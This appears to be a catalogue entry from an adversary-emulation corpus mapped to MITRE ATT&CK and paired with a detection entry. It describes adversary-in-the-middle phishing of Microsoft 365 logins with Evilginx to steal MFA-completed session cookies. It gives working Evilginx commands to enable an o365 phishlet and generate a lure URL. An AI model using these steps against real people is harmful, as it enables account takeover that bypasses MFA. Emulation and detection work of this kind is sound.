---
id: aitm-phish
title: AiTM phishing (Evilginx reverse-proxy, steal the session)
section: Microsoft 365 / Entra ID
phase: Initial Access
attack:
  tactic: TA0001
  techniques: [T1566.002]
platform: [cloud, network]
source: Evilginx / adversary-in-the-middle M365 phishing
pair: aitm-phish-signin
---

The front door of most cloud intrusions, and the one that beats MFA. Stand up an
adversary-in-the-middle proxy (Evilginx and its phishlets are the standard) that sits
between the victim and the *real* Microsoft login: the victim types their password and
completes MFA against Microsoft, the proxy relays it all, and you walk away with the
issued **session cookie** — a live, already-MFA'd token you replay to become them. No
malicious consent page and no fake login to fingerprint; the page is Microsoft's own,
reverse-proxied. A spearphishing *link* is the delivery (`T1566.002`) — the attachment
variant is a mail-gateway problem this corpus has no backend for, which is why the pair
is the link/AiTM shape. (Cloud — no on-host target, so no slots.)

```sh
# Evilginx: reverse-proxy the real M365 login and hand back a lure URL
evilginx> phishlets hostname o365 login.<attacker-domain>
evilginx> phishlets enable o365
evilginx> lures create o365
evilginx> lures get-url 0        # send this link; the captured session lands in the console
```
